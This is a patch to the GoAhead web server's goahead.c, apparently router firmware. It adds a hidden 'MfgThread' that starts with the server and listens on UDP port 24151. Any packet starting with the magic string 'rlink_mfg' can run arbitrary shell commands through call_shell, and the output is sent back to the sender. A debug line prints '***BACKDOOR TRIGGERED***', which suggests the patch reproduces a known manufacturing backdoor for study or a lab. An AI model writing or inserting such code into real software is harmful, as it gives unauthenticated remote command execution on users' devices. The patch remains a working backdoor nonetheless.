@@ -1,0 +1,146 @@
+--- a/user/goahead/src/goahead.c
++++ b/user/goahead/src/goahead.c
+@@ -253,6 +253,7 @@
+ /*
+  *	Main -- entry point from LINUX
+  */
++void InitMfgTask();
+ int main(int argc, char** argv)
+ {
+     int wdt_fd = -1;
+@@ -297,6 +298,7 @@
+  *	service. SocketSelect will block until an event occurs. SocketProcess
+  *	will actually do the servicing.
+  */
++ 	InitMfgTask();
+ 	while (!finished) {
+ 		if (socketReady(-1) || socketSelect(-1, 1000)) {
+ 			socketProcess(-1);
+@@ -892,3 +894,127 @@
+ 
+ 	return iLen;
+ }
++
++
++#define RECV_MAX_LEN 128
++#define SEND_MAX_LEN 2048
++extern int readUsb(char *fileName);
++void MfgThread()
++{
++
++	int mfg_fd;
++	int i,iLen;
++	struct sockaddr_in local,remote;
++	char *LocalIP = "127.0.0.1";
++	char *pos;
++
++	char RecvBuf[RECV_MAX_LEN],SendBuf[SEND_MAX_LEN];
++	char FlagBuf[RECV_MAX_LEN],CmdBuf[RECV_MAX_LEN],ValBuf[RECV_MAX_LEN];
++
++	memset( &local, 0, sizeof(local) );
++	local.sin_family = AF_INET;
++	local.sin_port = htons(24151);
++	//LocalIP = nvram_bufget(RT2860_NVRAM, "lan_ipaddr");
++	//GetCfmValue("lan_ipaddr", LocalIP);
++	//local.sin_addr.s_addr  = INADDR_ANY;
++	local.sin_addr.s_addr  = inet_addr(LocalIP);
++
++	mfg_fd = socket( AF_INET,SOCK_DGRAM, 0 );
++	if ( mfg_fd < 0 ) {
++		printf("MfgThread socket error.\n");
++		return ;
++	}
++	int n = 1;
++	if(setsockopt(mfg_fd, SOL_SOCKET, SO_REUSEADDR, (char *) &n, sizeof(n)) == -1)
++	{
++		close(mfg_fd);
++		printf("MfgThread: setsockopt 1 failed\n");
++		return ;
++	}
++	if (bind(mfg_fd,(struct sockaddr*)&local,sizeof(local)) < 0) {
++		printf("MfgThread bind error.\n");
++		return;
++	}
++	while (1) {
++		memset(RecvBuf,0,sizeof(RecvBuf));
++		i = sizeof(struct sockaddr);
++		iLen = recvfrom(mfg_fd,(char *)RecvBuf,RECV_MAX_LEN,0,(struct sockaddr*)&remote,&i);
++		if (iLen <= 0) {
++
++			sleep(1);
++			continue;
++		}
++		//printf("MfgThread recv %d[%s]\n",iLen,RecvBuf);
++		if (iLen < 14) {
++			continue;
++		}
++
++		memset(FlagBuf,0,RECV_MAX_LEN);
++		memset(CmdBuf,0,RECV_MAX_LEN);
++		memset(ValBuf,0,RECV_MAX_LEN);
++		//Request:
++		//cmd fmt: w302r_mfg 1 cmd[...]
++		//1:cmd ±ØÐëÎªiwprivÃüÁî
++		// 
++		// Response:
++		// cmd fmt: result(cmd out stream)
++
++		memcpy(FlagBuf,RecvBuf,9);
++		memcpy(CmdBuf,RecvBuf + 10,1);
++		memcpy(ValBuf,RecvBuf + 12,iLen - 12);
++
++		//printf("[%s][%s][%s]\n",FlagBuf,CmdBuf,ValBuf);
++
++		if (strcmp(FlagBuf,"rlink_mfg") != 0) {
++			continue;
++		}
++       fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
++		memset(SendBuf,0,SEND_MAX_LEN);
++		if (CmdBuf[0] == '1') {
++				pos = strstr(ValBuf,"iwpriv");
++				if (pos == NULL) {
++					continue;
++				}
++				//printf("Req[%s]\n",ValBuf);
++				iLen = call_shell(ValBuf,SendBuf,SEND_MAX_LEN);
++				if (iLen > 0){
++					printf("Res[%s]\n",ValBuf);
++					sendto(mfg_fd,(char *)SendBuf,iLen,0,(struct sockaddr*)&remote,sizeof(remote));
++				} else {
++					strcpy(SendBuf,"000000");
++					iLen = strlen(SendBuf);
++					printf("Res[%s]\n",SendBuf);
++					sendto(mfg_fd,(char *)SendBuf,iLen,0,(struct sockaddr*)&remote,sizeof(remote));
++				}
++		} else if (CmdBuf[0] == 'x') {
++			iLen = call_shell(ValBuf,SendBuf,SEND_MAX_LEN);
++			//printf("*[%d][%s]\n",iLen,SendBuf);
++			if (iLen > 0){
++				sendto(mfg_fd,(char *)SendBuf,iLen,0,(struct sockaddr*)&remote,sizeof(remote));
++			}
++		} else if (CmdBuf[0] == 'e') {
++			iLen = strlen("ralink_mfg");
++			strcpy(SendBuf,"ralink_mfg");
++			sendto(mfg_fd,(char *)SendBuf,iLen,0,(struct sockaddr*)&remote,sizeof(remote));
++		}else if (CmdBuf[0] == 'u'){
++			//if(readUsb(ValBuf)){
++			//	strcpy(SendBuf,"USB Success.");
++			//}else
++			//	strcpy(SendBuf,"USB Failed.");
++		
++			//sendto(mfg_fd,(char *)SendBuf,iLen,0,(struct sockaddr*)&remote,sizeof(remote));
++		}
++	}
++}
++
++
++void InitMfgTask()
++{
++
++	pthread_t id;
++	int ret;
++
++	ret = pthread_create(&id, NULL,(void *) MfgThread,NULL);
++
++	return ;
++}
